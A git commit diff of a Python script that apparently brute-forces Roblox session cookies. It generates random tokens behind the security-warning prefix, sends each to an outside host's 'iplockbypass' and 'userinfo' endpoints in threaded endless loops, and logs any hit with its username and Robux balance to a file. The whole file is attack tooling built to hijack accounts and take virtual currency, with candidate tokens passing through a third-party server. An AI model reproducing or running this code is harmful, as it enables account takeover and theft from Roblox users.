899e901c5bdfdbb54397fe8070bff7d891b1dc2b
Mohammed8339 <49081161+Mohammed8339@users.noreply.github.com>
2022-07-26 22:02:14 -0400

    Update main.py

--- main.py
+++ main.py
@@ -1,29 +1,35 @@
 import requests, json, re
 import random, string
 import threading
-from bs4 import BeautifulSoup
-
 
 def process():
-   while True:
-      valid_letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
-      rancookie = ''.join((random.choice(valid_letters) for i in range(776)))
-      finalcookie = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_" + rancookie
+    while True:
 
-      cookie = requests.get(f"https://story-of-jesus.xyz/iplockbypass?cookie={finalcookie}").text
-      r = requests.get(f'https://story-of-jesus.xyz/userinfo.php?cookie={cookie}')
-      data = r.json()
+        valid_letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
+        rancookie = ''.join((random.choice(valid_letters) for i in range(776)))
+        finalcookie = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_" + rancookie
 
-      if data["status"] == "failed":
-         falsecookie = rancookie[:29]
-         print("[INVALID] " + falsecookie + "...")
+        cookie = requests.get(f"https://story-of-jesus.xyz/iplockbypass?cookie={finalcookie}").text
 
-      else:
-         falsecookie = rancookie[:9]
-         print(f"[VALID]" + falsecookie + f" {data['username']} And Logged To File.")
-         f = open("cookies.txt", "a")
-         f.write(cookie + "\n")
-         f.close()
+        r = requests.get(f'https://story-of-jesus.xyz/userinfo.php?cookie={cookie}')
+        data = r.json()
+
+        if data["status"] == "failed":
+            
+            falsecookie = rancookie[:29]
+            print("[INVALID] " + falsecookie + "...")
+
+        elif data["status"] == "good":
+
+            falsecookie = rancookie[:9]
+            robuxamount = str(data['robux'])
+            print(f"[VALID]" + falsecookie + f"... USERNAME: '{data['username']}' Robux: '{robuxamount}' Logged To File.")
+            f = open("cookies.txt", "a")
+            f.write(str(rancookie + " Robux: " + robuxamount + "\n"))
+            f.close()
+
+        else:
+            exit()
 
 t1 = threading.Thread(target=process)
 t2 = threading.Thread(target=process)
